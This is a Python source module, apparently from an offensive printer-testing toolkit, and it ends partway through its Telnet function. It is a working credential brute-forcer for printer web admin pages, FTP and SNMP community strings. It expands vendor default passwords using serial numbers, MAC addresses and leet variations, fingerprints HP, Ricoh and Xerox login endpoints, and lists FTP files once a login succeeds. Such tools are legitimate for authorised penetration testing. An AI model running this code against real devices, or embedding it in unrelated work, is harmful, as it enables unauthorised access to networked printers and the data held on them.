#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PrinterXPL-Forge — Login Brute Force Module
=========================================
Tests default and derived credentials against printer management interfaces:
  - HTTP/HTTPS web admin (form login + HTTP Basic Auth + Digest)
  - FTP (port 21)
  - Telnet (port 23)
  - SNMP community strings (UDP/161)

Credential expansion pipeline:
  1. Vendor default credentials (from default_creds.py)
  2. Dynamic token resolution (__SERIAL__, __MAC6__, __MAC12__)
  3. Variation generation:
     - normal          → as-is
     - reverse         → password[::-1]
     - leet            → a→@, e→3, i→1, o→0, s→$, t→7, g→9
     - camelcase       → Password (first char uppercase)
     - UPPER           → PASSWORD
     - lower           → password
     - reverse_leet    → leet(reverse(password))

Usage:
    from modules.login_bruteforce import bruteforce
    results = bruteforce('192.168.0.152', vendor='epson', serial='XAABT77481')
"""
# Author    : Andre Henrique (@mrhenrike)
# GitHub    : https://github.com/mrhenrike
# LinkedIn  : https://linkedin.com/in/mrhenrike
# X/Twitter : https://x.com/mrhenrike

from __future__ import annotations

import ftplib
import json
import logging
import random
import re
import socket
import time
from dataclasses import dataclass, field
from typing import Dict, Iterator, List, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings()

from utils.default_creds import (
    Cred, SERIAL_TOKEN, MAC6_TOKEN, MAC12_TOKEN,
    get_creds_for_vendor,
)
from utils.wordlist_loader import (
    load_for_vendor,
    load_snmp_communities,
    load_ftp_creds,
    get_default_wordlist_path,
)

_log = logging.getLogger(__name__)

# ── ANSI colours ──────────────────────────────────────────────────────────────
_GRN = '\033[1;32m'
_RED = '\033[1;31m'
_YEL = '\033[1;33m'
_CYN = '\033[1;36m'
_DIM = '\033[2;37m'
_RST = '\033[0m'

# ── Constants ─────────────────────────────────────────────────────────────────
DEFAULT_TIMEOUT   = 6.0
DEFAULT_DELAY     = 0.3   # seconds between attempts (avoid lockouts)
MAX_ATTEMPTS      = 300   # hard cap on credential attempts

# HP FutureSmart EWS — cookie session via GET /AuthChk + HTTP Basic
_HP_AUTHCHK_PATH = '/AuthChk'
_HP_PWDCHK_PATH  = '/PwdChk'
_HP_DEVMGMT_PROBE = '/DevMgmt/ProductConfigDyn.xml'

# Xerox CentreWare — session start action
_XEROX_SESSION_HINT = {
    'markers': ('xerox', 'centreware', 'workcentre', 'versalink'),
    'probe':   '/status.html',
    'login':   '/ui/?_action=StartSession',
    'user':    'user',
    'pass':    'password',
}
_VENDOR_HTTP_PATHS: Dict[str, List[str]] = {
    'hp': [
        '/hp/device/webAccess/index.htm',
        '/hp/device/signin/index',
        '/hp/device/this.LCDispatcher?nav=hp.Print',
        '/hp/device/InternalPages/Index?id=Configuration',
        '/hp/device/info/configuration.html',
    ],
    'ricoh': [
        '/web/guest/en/websys/webArch/topPage.cgi',
        '/web/guest/en/websys/webArch/login.cgi',
        '/web/guest/en/websys/webArch/mainFrame.cgi',
        '/web/entry/en/address/login.html',
        '/web/',
    ],
    'epson': [
        '/PRESENTATION/HTML/TOP/PRTINFO.HTML',
        '/PRESENTATION/HTML/TOP/INDEX.HTML',
        '/web/index.cgi',
    ],
    'brother': [
        '/general/status.html',
        '/login.html',
    ],
    'xerox': [
        '/status',
        '/auth/login.html',
    ],
    'canon': [
        '/login.html',
        '/rui/login',
    ],
    'kyocera': [
        '/login.html',
        '/startwlm/Start_Wlm.htm',
    ],
    'samsung': [
        '/sws/app/wss/loginAction.sws',
        '/sws/index.html',
    ],
}

# Known form-login endpoints when GET page lacks obvious form markup (IM/webArch, etc.)
_VENDOR_FORM_HINTS: Dict[str, Dict[str, object]] = {
    'ricoh': {
        'markers': ('webarch', 'web image monitor', 'frameset'),
        'probe':   '/web/guest/en/websys/webArch/mainFrame.cgi',
        'login':   '/web/guest/en/websys/webArch/login.cgi',
        'user':    'userid',
        'pass':    'password',
    },
}

# Generic HTTP login form paths (probed after vendor-specific paths)
_HTTP_PATHS = [
    '/',
    '/login',
    '/admin',
    '/admin/login',
    '/web/login',
    '/cgi-bin/login.cgi',
    '/login.html',
    '/admin/',
]

# Sentinel credentials — never valid; used to detect endpoints that ignore auth.
_INVALID_PROBE_USER = '__pxf_invalid_user__'
_INVALID_PROBE_PASS = '__pxf_invalid_pass__'

# Minimum body delta (bytes) to treat two 200 responses as different.
_MIN_BODY_DELTA = 48

# Known form field names for username/password
_FORM_USER_FIELDS  = ['user', 'userid', 'username', 'login', 'User', 'UserName', 'name',
                       'admin_id', 'j_username', 'loginId', 'id']
_FORM_PASS_FIELDS  = ['pass', 'password', 'passwd', 'Password', 'PASS', 'pwd',
                       'admin_pass', 'j_password', 'loginPassword', 'pw']


# ── Result types ──────────────────────────────────────────────────────────────

@dataclass
class LoginResult:
    """Represents a single login attempt result."""
    protocol:   str       # http / https / ftp / telnet / snmp
    host:       str
    port:       int
    username:   str
    password:   Optional[str]
    success:    bool
    status:     str       # 'found' / 'invalid' / 'timeout' / 'error' / 'lockout'
    evidence:   str = ''
    url:        str = ''

    def password_display(self) -> str:
        return self.password if self.password is not None else '(blank)'

    def __str__(self) -> str:
        icon = f"{_GRN}[FOUND]{_RST}" if self.success else f"{_DIM}[----]{_RST}"
        return (f"{icon} {self.protocol.upper():<6} "
                f"{self.username!r:<14} / {self.password_display()!r:<20} "
                f"→ {self.status}")


@dataclass
class BruteforceReport:
    """Summary of brute-force campaign."""
    host:        str
    vendor:      str
    serial:      str
    total:       int = 0
    found:       List[LoginResult] = field(default_factory=list)
    all_results: List[LoginResult] = field(default_factory=list)

    @property
    def success(self) -> bool:
        return bool(self.found)


# ── Credential variation engine ───────────────────────────────────────────────

_LEET_MAP = str.maketrans({
    'a': '@', 'A': '@',
    'e': '3', 'E': '3',
    'i': '1', 'I': '1',
    'o': '0', 'O': '0',
    's': '$', 'S': '$',
    't': '7', 'T': '7',
    'g': '9', 'G': '9',
    'l': '|', 'L': '|',
    'b': '8', 'B': '8',
})


def leet(s: str) -> str:
    """Apply leet substitutions to a string."""
    return s.translate(_LEET_MAP)


def expand_password(
    raw_password: Optional[str],
    serial:       str = '',
    mac:          str = '',
    enable_variations: bool = True,
) -> List[Optional[str]]:
    """
    Expand a raw password token into a list of concrete passwords.

    Handles:
    - None  → blank string
    - __SERIAL__ → serial number + its variations
    - __MAC6__   → last 6 chars of MAC (no separators)
    - __MAC12__  → full MAC without separators
    - Regular strings → all variation modes

    Returns deduplicated ordered list.
    """
    mac_clean = re.sub(r'[:-]', '', mac).upper()
    mac6      = mac_clean[-6:] if mac_clean else ''
    mac12     = mac_clean

    # Resolve token
    if raw_password is None:
        base = ''
    elif raw_password == SERIAL_TOKEN:
        base = serial or ''
    elif raw_password == MAC6_TOKEN:
        base = mac6
    elif raw_password == MAC12_TOKEN:
        base = mac12
    else:
        base = raw_password

    if not base:
        # blank/empty password only
        return [None, '']

    seen: list = []
    def add(p: Optional[str]) -> None:
        if p not in seen:
            seen.append(p)

    add(base)                    # normal
    if enable_variations and base:
        add(base[::-1])          # reverse
        add(leet(base))          # leet
        add(base.capitalize())   # CamelCase (first char upper)
        add(base.upper())        # ALL UPPER
        add(base.lower())        # all lower
        add(leet(base[::-1]))    # reverse leet
        add(base + '1')          # append digit
        add(base + '!')          # append symbol
        add('1' + base)          # prepend digit
        # For serial-based: also try just last 8 / first 8 chars
        if raw_password == SERIAL_TOKEN and len(base) > 8:
            add(base[-8:])
            add(base[:8])
            add(base[-8:].lower())
            add(base[-8:].upper())

    return seen


def iter_credentials(
    vendor:            str,
    serial:            str = '',
    mac:               str = '',
    protocol_filter:   str = '',
    enable_variations: bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    wordlist_path:     Optional[str] = None,
) -> Iterator[Tuple[str, Optional[str]]]:
    """
    Yield (username, password) pairs for brute-forcing.

    Credentials are loaded from external wordlist files (not hardcoded).
    Combines: wordlist (vendor-specific + generic) + user-supplied extras.
    Expands dynamic tokens and variation modes.
    Deduplicates.

    Args:
        vendor:           Vendor name for section selection.
        serial:           Device serial number (resolves __SERIAL__ token).
        mac:              Device MAC address (resolves __MAC6__, __MAC12__).
        protocol_filter:  Only yield creds for this protocol ('' = all).
        enable_variations: Generate reverse/leet/camelcase variants.
        extra_creds:      Additional (user, pass) pairs prepended to the list.
        wordlist_path:    Custom wordlist path (replaces default wordlist).
    """
    # Load from wordlist (external file, no hardcoded data)
    wl = get_default_wordlist_path() if wordlist_path is None else wordlist_path
    creds: List[Cred] = load_for_vendor(vendor, wordlist_path=wl)

    # Prepend user-supplied extras (highest priority)
    if extra_creds:
        extra = [Cred(u, p, 'any') for u, p in extra_creds]
        creds = extra + creds

    seen: set = set()
    count = 0

    for cred in creds:
        # Protocol filter: skip if cred is protocol-specific and doesn't match
        if protocol_filter:
            if cred.protocol not in ('any', protocol_filter, 'http', 'https'):
                continue

        passwords = expand_password(cred.password, serial, mac, enable_variations)
        for pwd in passwords:
            pair = (cred.username, pwd)
            if pair in seen:
                continue
            seen.add(pair)
            yield cred.username, pwd
            count += 1
            if count >= MAX_ATTEMPTS:
                return


# ── HTTP attack ───────────────────────────────────────────────────────────────

def _http_fingerprint(response: requests.Response) -> Tuple[int, int, str]:
    """Stable fingerprint: status, content length, hash prefix of body."""
    import hashlib
    body = response.content or b''
    digest = hashlib.sha256(body[:4096]).hexdigest()[:16]
    return response.status_code, len(body), digest


def _responses_equivalent(a: requests.Response, b: requests.Response) -> bool:
    """True when two responses look identical for auth-validation purposes."""
    fa = _http_fingerprint(a)
    fb = _http_fingerprint(b)
    if fa[0] != fb[0]:
        return False
    if fa[2] != fb[2]:
        return False
    return abs(fa[1] - fb[1]) < _MIN_BODY_DELTA


def _http_get(url: str, timeout: float, auth: Optional[Tuple[str, str]] = None) -> Optional[requests.Response]:
    try:
        return requests.get(
            url, auth=auth, timeout=timeout, verify=False, allow_redirects=True,
        )
    except Exception:
        return None


def _detect_hp_futuresmart(host: str, port: int, scheme: str,
                           timeout: float) -> bool:
    """True when target exposes HP FutureSmart EWS (DevMgmt / AuthChk / Unified SPA)."""
    base = f"{scheme}://{host}:{port}"
    try:
        r = requests.get(f"{base}{_HP_PWDCHK_PATH}", timeout=timeout, verify=False)
        if r.status_code == 200 and 'haspwd' in r.text.lower():
            return True
    except Exception:
        pass
    try:
        r = requests.get(f"{base}{_HP_DEVMGMT_PROBE}", timeout=timeout, verify=False)
        if r.status_code == 200 and 'PasswordStatus' in r.text:
            return True
    except Exception:
        pass
    try:
        r = requests.get(f"{base}/", timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code == 200 and 'framework/unified.js' in r.text.lower():
            return True
    except Exception:
        pass
    return False


def _parse_hp_authchk_response(body: str) -> Optional[bool]:
    """Return True/False for authenticated, None if response is inconclusive."""
    if not body or not body.strip():
        return None
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return None
    if isinstance(data, list) and data:
        data = data[0]
    if not isinstance(data, dict):
        return None
    payload = data.get('pgmData', data)
    if isinstance(payload, dict) and 'hasAuth' in payload:
        return bool(payload['hasAuth'])
    if isinstance(data, dict) and 'hasAuth' in data:
        return bool(data['hasAuth'])
    return None


def _try_hp_session_auth(host: str, port: int, scheme: str,
                         username: str, password: Optional[str],
                         timeout: float,
                         session: Optional[requests.Session] = None) -> Tuple[bool, int, str]:
    """
    HP FutureSmart EWS session login via GET /AuthChk with HTTP Basic + sid cookie.

    The browser SPA bootstraps sid from GET / then validates credentials at /AuthChk.
    """
    pwd = password if password is not None else ''
    sess = session or requests.Session()
    sess.verify = False
    base = f"{scheme}://{host}:{port}"

    try:
        sess.get(f"{base}/", timeout=timeout, allow_redirects=True)
    except Exception:
        return False, 0, 'connection_error'

    headers = {'X-Auth-Client-Counter': str(random.randint(0, 999_999))}
    try:
        r = sess.get(
            f"{base}{_HP_AUTHCHK_PATH}",
            auth=(username, pwd),
            headers=headers,
            timeout=timeout,
            allow_redirects=True,
        )
    except requests.exceptions.ConnectionError:
        return False, 0, 'connection_error'
    except Exception as exc:
        return False, 0, str(exc)[:60]

    code = r.status_code
    text = (r.text or '').lower()

    if code == 403:
        counter = r.headers.get('X-Auth-Counter', '')
        if counter and int(counter or 0) >= 5:
            return False, code, 'lockout_detected'
        if 'locked' in text:
            return False, code, 'lockout_detected'
        return False, code, ''

    if code == 401:
        return False, code, ''

    if code == 200:
        has_auth = _parse_hp_authchk_response(r.text)
        if has_auth is True:
            return True, code, f'HP EWS AuthChk session accepted ({scheme}://{host}{_HP_AUTHCHK_PATH})'
        if has_auth is False:
            return False, code, ''
        # Some firmware returns empty 200 only after successful auth
        if r.content and b'hasAuth' in r.content:
            return False, code, ''

    return False, code, ''


def _http_paths_for_vendor(vendor: str) -> List[str]:
    """Return ordered unique HTTP paths for login detection."""
    key = (vendor or 'generic').lower().strip()
    vendor_paths = _VENDOR_HTTP_PATHS.get(key, [])
    seen: set = set()
    ordered: List[str] = []
    for path in vendor_paths + _HTTP_PATHS:
        if path not in seen:
            seen.add(path)
            ordered.append(path)
    return ordered


def _parse_login_form(html: str, base_url: str) -> Tuple[str, str, str]:
    """
    Extract form POST target and field names from HTML.

    Returns: (post_url, user_field, pass_field) — empty post_url if not found.
    """
    from urllib.parse import urljoin
    text = html or ''
    lower = text.lower()

    # Find first <form> block (simple regex — sufficient for printer EWS pages)
    form_match = re.search(r'<form\b[^>]*>(.*?)</form>', text, re.I | re.S)
    form_tag = form_match.group(0) if form_match else text[:4096]

    action = ''
    m_action = re.search(r'<form\b[^>]*\baction=["\']([^"\']*)["\']', form_tag, re.I)
    if m_action:
        action = urljoin(base_url, m_action.group(1).strip())

    uf = ''
    pf = ''
    for form_field in _FORM_USER_FIELDS:
        if re.search(rf'name=["\']{re.escape(form_field)}["\']', form_tag, re.I):
            uf = form_field
            break
    for pass_field in _FORM_PASS_FIELDS:
        if re.search(rf'name=["\']{re.escape(pass_field)}["\']', form_tag, re.I):
            pf = pass_field
            break

    if not uf:
        uf = next((f for f in _FORM_USER_FIELDS if f.lower() in lower), 'username')
    if not pf:
        pf = next((f for f in _FORM_PASS_FIELDS if f.lower() in lower), 'password')

    post_url = action or base_url
    return post_url, uf, pf


def _detect_http_login(host: str, port: int, scheme: str,
                        timeout: float, vendor: str = 'generic') -> Tuple[str, str, str, str]:
    """
    Probe printer web interface to discover login URL, form fields, and auth mode.

    Returns: (login_url, user_field, pass_field, auth_mode)
      auth_mode: 'basic_required' | 'form' | 'hp_session' | 'unknown'
    """
    vendor_key = (vendor or 'generic').lower().strip()

    # HP FutureSmart — AuthChk session (probe canonical EWS ports, not alt nginx :8443)
    if vendor_key in ('hp', 'hewlett-packard', 'hewlett packard', 'generic', ''):
        hp_ports = [(port, scheme)]
        for p, sch in ((80, 'http'), (443, 'https')):
            if (p, sch) not in hp_ports:
                hp_ports.append((p, sch))
        for p, sch in hp_ports:
            if _detect_hp_futuresmart(host, p, sch, timeout):
                return (
                    f"{sch}://{host}:{p}{_HP_AUTHCHK_PATH}",
                    '', '', 'hp_session',
                )

    for path in _http_paths_for_vendor(vendor):
        url = f"{scheme}://{host}:{port}{path}"
        try:
            r = requests.get(url, timeout=timeout, verify=False,
                             allow_redirects=True)
            final_url = r.url
            text = r.text.lower()
            if r.status_code == 401 or r.headers.get('WWW-Authenticate'):
                return final_url, '', '', 'basic_required'
            if any(kw in text for kw in ('login', 'password', 'signin', 'userid', 'username')):
                post_url, uf, pf = _parse_login_form(r.text, final_url)
                return post_url, uf, pf, 'form'
        except Exception:
            continue

    # Vendor-specific fallback (Ricoh IM webArch — login via POST to login.cgi)
    hint = _VENDOR_FORM_HINTS.get(vendor_key)
    if hint:
        ricoh_ports = [(port, scheme)]
        if vendor_key == 'ricoh' and (80, 'http') not in ricoh_ports:
            ricoh_ports.append((80, 'http'))
        for p, sch in ricoh_ports:
            probe_url = f"{sch}://{host}:{p}{hint['probe']}"
            try:
                r = requests.get(probe_url, timeout=timeout, verify=False, allow_redirects=True)
                body = r.text.lower()
                markers = hint.get('markers') or (hint.get('marker', ''),)
                if r.status_code == 200 and any(m in body for m in markers):
                    login_url = f"{sch}://{host}:{p}{hint['login']}"
                    return login_url, hint['user'], hint['pass'], 'form'
            except Exception:
                continue

    # Xerox session login fallback
    if vendor_key == 'xerox':
        probe_url = f"{scheme}://{host}:{port}{_XEROX_SESSION_HINT['probe']}"
        try:
            r = requests.get(probe_url, timeout=timeout, verify=False, allow_redirects=True)
            body = r.text.lower()
            if r.status_code == 200 and any(m in body for m in _XEROX_SESSION_HINT['markers']):
                login_url = f"{scheme}://{host}:{port}{_XEROX_SESSION_HINT['login']}"
                return login_url, _XEROX_SESSION_HINT['user'], _XEROX_SESSION_HINT['pass'], 'form'
        except Exception:
            pass

    return f"{scheme}://{host}:{port}/", 'username', 'password', 'unknown'


def _validate_basic_auth(url: str, username: str, password: Optional[str],
                         timeout: float) -> Tuple[bool, int, str]:
    """
    Confirm HTTP Basic/Digest auth — reject endpoints that return 200 for any creds.

    Strategy:
      1. GET without auth → baseline
      2. GET with candidate creds
      3. GET with known-invalid creds
    Success only when candidate response differs from both baseline and invalid probe.
    For 401-protected URLs: candidate must be 200 (or 2xx) and invalid must stay 401.
    """
    pwd = password if password is not None else ''

    r_none = _http_get(url, timeout)
    if r_none is None:
        return False, 0, 'connection_error'

    r_try = _http_get(url, timeout, auth=(username, pwd))
    if r_try is None:
        return False, 0, 'connection_error'

    r_bad = _http_get(url, timeout, auth=(_INVALID_PROBE_USER, _INVALID_PROBE_PASS))
    if r_bad is None:
        r_bad = r_none

    # Classic Basic/Digest: 401 without credentials
    if r_none.status_code == 401:
        if r_try.status_code in (200, 204) and r_bad.status_code == 401:
            return True, r_try.status_code, f'HTTP Basic required; 401→{r_try.status_code} at {url}'
        if r_try.status_code == 401:
            return False, 401, ''
        return False, r_try.status_code, ''

    # 200 (or redirect) without auth — only accept if creds change the response
    if r_none.status_code in (200, 301, 302, 303, 307, 308):
        if r_try.status_code not in (200, 301, 302, 303, 307, 308):
            return False, r_try.status_code, ''

        # Same body for no-auth, candidate, and garbage → endpoint ignores Basic
        if (_responses_equivalent(r_none, r_try)
                and _responses_equivalent(r_try, r_bad)):
            return False, r_try.status_code, 'endpoint ignores HTTP Basic (identical response)'

        # Candidate matches no-auth or invalid probe → not authenticated
        if _responses_equivalent(r_try, r_none) or _responses_equivalent(r_try, r_bad):
            return False, r_try.status_code, ''

        # Meaningful delta vs both baselines
        if not _responses_equivalent(r_try, r_none) and not _responses_equivalent(r_try, r_bad):
            return True, r_try.status_code, (
                f'HTTP Basic changed response at {url} '
                f'(len {len(r_none.content)}→{len(r_try.content)})'
            )

    return False, r_try.status_code, ''


def _try_http_login(session: requests.Session, url: str,
                     user_field: str, pass_field: str,
                     username: str, password: Optional[str],
                     timeout: float,
                     auth_mode: str = 'unknown',
                     basic_viable: bool = True) -> Tuple[bool, int, str]:
    """
    Attempt login via HTTP Basic Auth or form POST.

    Returns: (success, status_code, evidence)
    """
    pwd = password if password is not None else ''

    # Lockout / rate-limit signals
    def _is_lockout(code: int, text: str) -> bool:
        if code in (429, 503):
            return True
        return any(kw in text for kw in (
            'locked out', 'lockout', 'too many', 'temporarily blocked',
            'try again later', 'account locked', 'access denied for',
        ))

    # 1. HP FutureSmart session auth (/AuthChk + sid cookie)
    if auth_mode == 'hp_session':
        host_port = re.match(r'https?://([^/:]+):?(\d+)?', url)
        if host_port:
            h = host_port.group(1)
            p = int(host_port.group(2) or (443 if url.startswith('https') else 80))
            sch = 'https' if url.startswith('https') else 'http'
            ok, code, evidence = _try_hp_session_auth(
                h, p, sch, username, password, timeout, session=session,
            )
            if evidence == 'lockout_detected':
                return False, code, evidence
            if ok:
                return True, code, evidence
        return False, 0, ''

    # 2. HTTP Basic — strict validation (fixes HP EWS/nginx false positives)
    if basic_viable and auth_mode in ('basic_required', 'unknown') and not user_field:
        ok, code, evidence = _validate_basic_auth(url, username, password, timeout)
        if ok:
            return True, code, evidence
        if auth_mode == 'basic_required':
            return False, code, evidence

    # 3. Form POST (Epson, Ricoh, HP signin, etc.)
    if user_field and pass_field:
        try:
            r_login_page = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
            login_fp = _http_fingerprint(r_login_page) if r_login_page else None
        except Exception:
            r_login_page = None
            login_fp = None

        try:
            post_data = {user_field: username, pass_field: pwd}
            r = session.post(url, data=post_data, timeout=timeout,
                             verify=False, allow_redirects=True)
            code = r.status_code
            text = r.text.lower()

            if _is_lockout(code, text):
                return False, code, 'lockout_detected'

            # Sentinel POST — reject endpoints that return identical bodies for any creds
            r_bad = session.post(
                url,
                data={user_field: _INVALID_PROBE_USER, pass_field: _INVALID_PROBE_PASS},
                timeout=timeout, verify=False, allow_redirects=True,
            )

            if _responses_equivalent(r, r_bad):
                return False, code, 'form endpoint ignores credentials (identical response)'

            if r_login_page and _responses_equivalent(r_login_page, r):
                return False, code, 'form response identical to login page'

            if code in (200, 302, 301):
                fail_indicators = (
                    'invalid password', 'incorrect password', 'login failed',
                    'authentication failed', 'wrong password', 'denied',
                    'unauthorized', 'bad credentials', 'login error',
                )
                success_indicators = (
                    'logout', 'signout', 'sign out', 'log out',
                    'dashboard', 'maintenance', 'network settings',
                    'printer info', 'device status', 'configuration page',
                )
                has_fail = any(kw in text for kw in fail_indicators)
                has_success = any(kw in text for kw in success_indicators)

                if has_success and not has_fail:
                    return True, code, f'Form POST accepted (status {code}) at {url}'

                # Redirect away from login without explicit success markers
                if code in (301, 302) and 'location' in r.headers:
                    loc = r.headers['location'].lower()
                    if 'logout' not in loc and 'login' not in loc and 'signin' not in loc:
                        return True, code, f'Redirect to {loc} after POST — likely success'

                # Meaningful body change vs sentinel, no explicit failure text
                if not has_fail and not _responses_equivalent(r, r_bad):
                    if login_fp and not _responses_equivalent(r_login_page, r):
                        return True, code, (
                            f'Form POST changed response at {url} '
                            f'(len {len(r_bad.content)}→{len(r.content)})'
                        )

        except requests.exceptions.ConnectionError:
            return False, 0, 'connection_error'
        except Exception as exc:
            return False, 0, str(exc)[:60]

    return False, 0, ''


def bruteforce_http(
    host:              str,
    port:              int = 80,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    scheme:            str = 'http',
    timeout:           float = DEFAULT_TIMEOUT,
    delay:             float = DEFAULT_DELAY,
    enable_variations: bool = True,
    stop_on_first:     bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    wordlist_path:     Optional[str] = None,
    verbose:           bool = True,
) -> List[LoginResult]:
    """HTTP/HTTPS brute force against printer web interface."""
    results: List[LoginResult] = []

    login_url, user_field, pass_field, auth_mode = _detect_http_login(
        host, port, scheme, timeout, vendor=vendor,
    )
    if verbose:
        wl_label = wordlist_path or get_default_wordlist_path() or "(not found)"
        print(f"\n  {_CYN}[HTTP BF]{_RST} {scheme}://{host}:{port} | "
              f"vendor={vendor} serial={serial or '-'}")
        print(f"  Wordlist: {wl_label}")
        print(f"  Login URL: {login_url}  mode={auth_mode!r}  "
              f"fields: {user_field!r}/{pass_field!r}")

    # Pre-flight: skip when endpoint ignores HTTP Basic and no form/session login found
    basic_viable = auth_mode == 'basic_required'
    if auth_mode == 'hp_session':
        basic_viable = False
    elif auth_mode == 'unknown' and not user_field:
        probe = _http_get(login_url, timeout)
        probe_bad = _http_get(login_url, timeout, auth=(_INVALID_PROBE_USER, _INVALID_PROBE_PASS))
        if (probe and probe_bad
                and probe.status_code in (200, 301, 302)
                and probe_bad.status_code in (200, 301, 302)
                and _responses_equivalent(probe, probe_bad)):
            if verbose:
                print(f"  {_YEL}[!] URL ignores HTTP Basic — skipping Basic auth at "
                      f"{login_url}{_RST}")
                print(f"  {_DIM}    No form login detected; device may use session/cookie "
                      f"auth on another path{_RST}")
            return results
        basic_viable = True
    elif auth_mode == 'basic_required':
        basic_viable = True

    session = requests.Session()
    session.verify = False

    for username, password in iter_credentials(
        vendor, serial, mac, 'http', enable_variations, extra_creds, wordlist_path
    ):
        pwd_display = password if password is not None else '(blank)'
        if verbose:
            print(f"  {_DIM}» {username!r:<14} / {pwd_display!r}{_RST}", end='\r')

        success, code, evidence = _try_http_login(
            session, login_url, user_field, pass_field,
            username, password, timeout,
            auth_mode=auth_mode, basic_viable=basic_viable,
        )

        result = LoginResult(
            protocol  = scheme,
            host      = host,
            port      = port,
            username  = username,
            password  = password,
            success   = success,
            status    = 'lockout' if evidence == 'lockout_detected' else (
                'found' if success else 'invalid'),
            evidence  = evidence,
            url       = login_url,
        )
        results.append(result)

        if evidence == 'lockout_detected':
            print(f"\n  {_YEL}[!] Lockout/rate-limit detected — stopping HTTP BF{_RST}")
            break

        if success:
            print(f"\n  {_GRN}[+] FOUND:{_RST} {scheme.upper()} {host}:{port} "
                  f"→ {username!r} / {pwd_display!r}")
            if verbose:
                print(f"       Evidence: {evidence}")
            if stop_on_first:
                break

        time.sleep(delay)

    return results


# ── FTP attack ────────────────────────────────────────────────────────────────

def bruteforce_ftp(
    host:              str,
    port:              int = 21,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    timeout:           float = DEFAULT_TIMEOUT,
    delay:             float = DEFAULT_DELAY,
    enable_variations: bool = True,
    stop_on_first:     bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    wordlist_path:     Optional[str] = None,
    verbose:           bool = True,
) -> List[LoginResult]:
    """FTP brute force against printer file system."""
    results: List[LoginResult] = []

    # Check if FTP is open first
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
    except Exception:
        return results  # FTP not open

    if verbose:
        print(f"\n  {_CYN}[FTP BF]{_RST} {host}:{port} | vendor={vendor}")

    for username, password in iter_credentials(
        vendor, serial, mac, 'ftp', enable_variations, extra_creds, wordlist_path
    ):
        pwd_display = password if password is not None else '(blank)'
        if verbose:
            print(f"  {_DIM}» {username!r:<14} / {pwd_display!r}{_RST}", end='\r')

        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(username, password or '')
            # Success
            listing = ''
            try:
                listing = str(ftp.nlst()[:10])
            except Exception:
                pass
            ftp.quit()

            result = LoginResult(
                protocol = 'ftp',
                host     = host,
                port     = port,
                username = username,
                password = password,
                success  = True,
                status   = 'found',
                evidence = f'FTP login successful. Files: {listing[:80]}',
            )
            results.append(result)
            print(f"\n  {_GRN}[+] FOUND:{_RST} FTP {host}:{port} "
                  f"→ {username!r} / {pwd_display!r}")
            if stop_on_first:
                break

        except ftplib.error_perm:
            results.append(LoginResult('ftp', host, port, username, password,
                                       False, 'invalid'))
        except Exception as exc:
            results.append(LoginResult('ftp', host, port, username, password,
                                       False, 'error', str(exc)[:40]))
        time.sleep(delay)

    return results


# ── SNMP community string attack ──────────────────────────────────────────────

_SNMP_TEST_OID = '1.3.6.1.2.1.1.1.0'   # sysDescr


def bruteforce_snmp(
    host:              str,
    port:              int = 161,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    timeout:           float = 3.0,
    enable_variations: bool = False,  # variations rarely useful for SNMP strings
    stop_on_first:     bool = False,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    wordlist_path:     Optional[str] = None,
    verbose:           bool = True,
) -> List[LoginResult]:
    """Test SNMP community strings (read and write) from snmp_communities.txt wordlist."""
    results: List[LoginResult] = []

    try:
        import warnings
        warnings.filterwarnings('ignore', category=RuntimeWarning)
        from pysnmp.hlapi import (
            getCmd, CommunityData, UdpTransportTarget,
            ContextData, ObjectType, ObjectIdentity, SnmpEngine,
        )
    except ImportError:
        _log.debug("pysnmp not available — skipping SNMP brute force")
        return results

    if verbose:
        print(f"\n  {_CYN}[SNMP BF]{_RST} {host}:{port} | vendor={vendor}")

    # Load community strings from wordlist file (not hardcoded)
    communities: List[str] = []
    seen_comm: set = set()

    # Primary source: snmp_communities.txt
    for comm in load_snmp_communities(wordlist_path):
        if comm not in seen_comm:
            seen_comm.add(comm)
            communities.append(comm)

    # Also pull community strings from main wordlist SNMP sections
    wl = wordlist_path or get_default_wordlist_path()
    for cred in load_for_vendor(vendor, wordlist_path=wl):
        if cred.protocol == 'snmp':
            comm = cred.username or (cred.password or '')
            if comm and comm not in seen_comm:
                seen_comm.add(comm)
                communities.append(comm)

    # Add extra_creds if any
    if extra_creds:
        for u, p in extra_creds:
            for c in [u, p]:
                if c and c not in seen_comm:
                    seen_comm.add(c)
                    communities.append(c)

    # Inject serial-based communities (often used as SNMP community)
    for common in [serial.lower(), serial.upper()]:
        if common and common not in seen_comm:
            seen_comm.add(common)
            communities.append(common)

    for comm in communities:
        if verbose:
            print(f"  {_DIM}» community={comm!r}{_RST}", end='\r')

        try:
            for err_ind, err_stat, _, var_binds in getCmd(
                SnmpEngine(),
                CommunityData(comm, mpModel=1),
                UdpTransportTarget((host, port), timeout=timeout, retries=0),
                ContextData(),
                ObjectType(ObjectIdentity(_SNMP_TEST_OID)),
            ):
                if not err_ind and not err_stat:
                    descr = str(var_binds[0][1])[:80] if var_binds else ''
                    result = LoginResult(
                        protocol = 'snmp',
                        host     = host,
                        port     = port,
                        username = comm,
                        password = None,
                        success  = True,
                        status   = 'found',
                        evidence = f'sysDescr: {descr}',
                    )
                    results.append(result)
                    print(f"\n  {_GRN}[+] FOUND:{_RST} SNMP community={comm!r}")
                    if verbose:
                        print(f"       sysDescr: {descr}")
                    if stop_on_first:
                        return results
                    break
        except Exception:
            pass

    return results


# ── Telnet attack ─────────────────────────────────────────────────────────────

def bruteforce_telnet(
    host:              str,
    port:              int = 23,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    timeout:           float = DEFAULT_TIMEOUT,
    delay:             float = DEFAULT_DELAY,
    enable_variations: bool = True,
    stop_on_first:     bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    wordlist_path:     Optional[str] = None,
    verbose:           bool = True,
